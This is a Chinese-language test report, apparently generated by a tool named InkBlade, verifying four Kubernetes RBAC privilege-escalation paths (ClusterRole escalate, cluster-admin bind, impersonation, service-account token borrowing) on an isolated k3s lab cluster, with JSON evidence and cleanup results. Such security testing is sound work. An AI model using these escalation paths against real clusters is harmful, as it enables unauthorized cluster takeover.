# InkBlade 提权真集群验证（QEMU k3s）

- 生成：2026-10-25T16:47:39Z
- 环境：QEMU TCG + Alpine + k3s (single control-plane)；kubectl v1.36.5；server v1.36.5+k3s1
- 结果：**4/4 PASS**
- 范围：真实 k3s apiserver/RBAC（QEMU TCG 单节点）；非云托管控制面/节点 root/云 IAM 验证。

| 路径 | 主体 | before | after | 状态 |
|---|---|---|---|---|
| `escalate` | system:serviceaccount:privesc-lab:esc-sa | False | True | PASS |
| `bind` | system:serviceaccount:privesc-lab:bind-sa | False | True | PASS |
| `impersonate` | system:serviceaccount:privesc-lab:imp-sa | False | True | PASS |
| `sa-token` | system:serviceaccount:privesc-lab:token-sa | False | True | PASS |

## 证据

### escalate

```json
{
  "id": "escalate",
  "title": "escalate 动词改写已绑定 ClusterRole",
  "subject": "system:serviceaccount:privesc-lab:esc-sa",
  "action": "patch clusterrole esc-editable -> rules=*",
  "action_ok": true,
  "before_admin": false,
  "after_admin": true,
  "cluster_read_after": true,
  "status": "PASS"
}
```

```json
{
  "patch": "clusterrole.rbac.authorization.k8s.io/esc-editable patched",
  "get_nodes": "node/k3s"
}
```

### bind

```json
{
  "id": "bind",
  "title": "bind cluster-admin + 创建 ClusterRoleBinding",
  "subject": "system:serviceaccount:privesc-lab:bind-sa",
  "action": "create clusterrolebinding privesc-bind-proof -> cluster-admin",
  "action_ok": true,
  "before_admin": false,
  "after_admin": true,
  "cluster_read_after": true,
  "status": "PASS"
}
```

```json
{
  "create_binding": "clusterrolebinding.rbac.authorization.k8s.io/privesc-bind-proof created",
  "get_nodes": "node/k3s"
}
```

### impersonate

```json
{
  "id": "impersonate",
  "title": "impersonate 冒充 cluster-admin User",
  "subject": "system:serviceaccount:privesc-lab:imp-sa",
  "action": "kubectl --as=privesc-superuser get nodes",
  "action_ok": true,
  "before_admin": false,
  "after_admin": true,
  "cluster_read_after": true,
  "status": "PASS"
}
```

```json
{
  "impersonated_get_nodes": "node/k3s"
}
```

### sa-token

```json
{
  "id": "sa-token",
  "title": "TokenRequest 借用高权 SA",
  "subject": "system:serviceaccount:privesc-lab:token-sa",
  "target_sa": "system:serviceaccount:privesc-lab:privesc-admin",
  "action": "create token privesc-admin -> 独立 kubeconfig",
  "action_ok": true,
  "before_admin": false,
  "after_admin": true,
  "cluster_read_after": true,
  "token_length": 965,
  "token_sha256_8": "c328a749",
  "status": "PASS"
}
```

```json
{
  "get_nodes": "node/k3s"
}
```

## 清理

```json
{
  "kept": false,
  "verified": true,
  "residue": [],
  "delete_rc": 0,
  "delete_stderr": ""
}
```

## fake-kubectl 闭环

- 结果：4/4 PASS（内存态，确定性）
- 覆盖：escalate / bind / SA token / webhook 写入后提权
